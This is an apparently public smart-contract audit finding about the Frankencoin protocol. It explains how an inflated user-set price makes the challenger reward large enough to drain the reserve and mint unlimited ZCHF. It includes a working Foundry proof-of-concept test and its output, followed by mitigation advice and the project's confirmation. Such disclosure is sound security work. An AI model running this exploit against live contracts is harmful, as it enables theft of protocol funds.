[H-06]CHALLENGER_REWARDcan be used to drain reserves and free mint
Submitted byLirios, also found byshalaamum,juancito,0xDACA,Kumpa,__141345__,__141345__,bin2chen,cccz,said,tallo,juancito,Emmanuel,BenRai,jangle,T1MOH,bughunter007,juancito,cccz,nobody2018,SpicyMeatball,117l11,117l11,ChrisTina, andvakzz
The goal of the auction mechanism is to determine the fair price of the collateral, so that Frankencoin (ZCHF) is always sufficiently backed and the system remains in balance.
If the challenge is successful, the bidder gets the collateral from the position and the position is closed, distributing excess proceeds to the reserve and paying a reward to the challenger.
The reward for the challenger is based on the user provided price and can be abused to have the protocol pay unlimited rewards.
Proof of Concept
When a challenge ends without being Averted, theend()function can be called to process the liquidation.
This process pays back the mintedZCHFtokens with the bid and sends the collateral to the bidder. The challenger receives back the collateral he supplied when starting the challenge, and receives aCHALLENGER_REWARDof 2% of the challenged collateral value inZCHF.
To calculate the value of the reward, it usesuint256 reward = (volume * CHALLENGERREWARD) / 1000\000;withvolumebeing thevolumeZCHFvalue returned fromPosition.notifyChallengeSucceeded()This is calculated asuint256 volumeZCHF = _mulD18(price, _size);// How much could have minted with the challenged amount of the collateralmeaning that if the price is very high, the theoretical volumeZCHF  will be very high too.
When there are insufficient funds in the Position to pay for the reward,FrankenCoin.notifyLoss()is used to get the funds from the reserve and mint new coins.
The price of a Position can be set when it is created, or later by the owner via an adjustPrice call.The steps to take:
Position owner mints the maximum ZCHF.Position owner adjusts price and sets it to a very large value.Owner immediately starts a challenge via MintingHub
When price is very high, if there are bids, they will never pass the AvertChallenge check of_bidAmountZCHF * ONE_DEC18 >= price * _collateralAmountso the Challenge will always succeed.After the challenge period, the end()  function can be called, and Challenger will receive a high amount of ZCHF as a fee.
An alternative and faster way is to create a new position and immediately challenge it.
When creating a Position,_challengeSecondscan be set to 0 and callinglaunchChallengeis possible before Position start waiting time is over. This makes it possible for any user to drain all reserves and mint a large number of ZCHF in 1 transaction.
POC Script
A proof of concept testscript is created to demonstrate the vulnerability.
This code was added toGeneralTest.t.sol
functionshowBalances()public{addresshacker=0xBaDbaDBAdBaDBaDbaDbABDbAdBAdBaDbADBadB01;console.log('================ Balances ================');console.log('hacker xchf     :',xchf.balanceOf(hacker)/1e18);console.log('hacker zchf     :',zchf.balanceOf(hacker)/1e18);console.log('reserver zchf   :',zchf.balanceOf(address(zchf.reserve()))/1e18);console.log('zchf.totalSupply:',zchf.totalSupply()/1e18);console.log(' ');}functiontest10AbuseChallengeReward()public{test04Mint();// let bob/alice open position so not all is empty// init, start wit 2 xchf and 1000 zhfaddresshacker=0xBaDbaDBAdBaDBaDbaDbABDbAdBAdBaDbADBadB01;TestTokenxchf_=TestToken(address(swap.chf()));xchf_.mint(address(hacker),1002ether);vm.startPrank(hacker);xchf_.approve(address(swap),1000ether);swap.mint(1000ether);showBalances();// open a position with fake inflated price and dummy collateral.// _challengeSeconds to 0 so we can immediately challenge and endxchf_.approve(address(hub),1ether);// collateralzchf.approve(address(hub),1000ether);// 1000 OPENING_FEEaddressmyPosition=hub.openPosition(address(xchf_),// _collateralAddress,1ether,// _minCollateral1ether,// _initialCollateral1000ether,// _mintingMaximum3days,// _initPeriodSeconds minimum perios10days,// _expirationSeconds0,// _challengeSeconds set to 0 to immediately challenge and end0,//_mintingFeePPM,type(uint256).max/1e20,// _liqPrice - huge inflated price0// _reservePPM);console.log('Creates our Position with inflated price, 1000 opening fee to reserves 1 xchf as collateral');showBalances();console.log('Start launchChallenge and immediately end the auction.');console.log('We will receive the 1 xchf collateral back');console.log('and 2% of inflated collateral price in zchf as CHALLENGER_REWARD');console.log('zchf is first taken all from reserve, and rest minted');xchf_.approve(address(hub),1ether);// collateraluint256challengeID=hub.launchChallenge(myPosition,1ether);hub.end(challengeID);showBalances();vm.stopPrank();}
The results of the test
[PASS] test10AbuseChallengeReward() (gas: 3939346)Logs:================ Balances ================hacker xchf     : 2hacker zchf     : 1000reserver zchf   : 23500zchf.totalSupply: 102000We have creates our Position with inflated price================ Balances ================hacker xchf     : 1hacker zchf     : 0reserver zchf   : 24500zchf.totalSupply: 102000Start launchChallenge and immediately end the auction.We will receive the 1 xchf collateral backand 2% of inflated collateral price in zchf as CHALLENGER_REWARDzchf is first taken all from reserve, and rest minted================ Balances ================hacker xchf     : 2hacker zchf     : 23158417847463239084714197001737581570reserver zchf   : 0zchf.totalSupply: 23158417847463239084714197001737659070
Tools Used
Manual review, forge
Recommended Mitigation Steps
It would be recommeded to restrict the moments when challenges can be started so Positions cannot be challenged before start time and when they are denied.
This will make challenges only possible when a position once was valid, with a valid price.
To prevent owners to change the price of their Position to an extremenly large value, it can be limited to change the price max x% per adjustment.
luziusmeisser (Frankencoin) confirmed and commented:
This is probably the most important issue revealed during the audit. The warden deserves a big reward for this!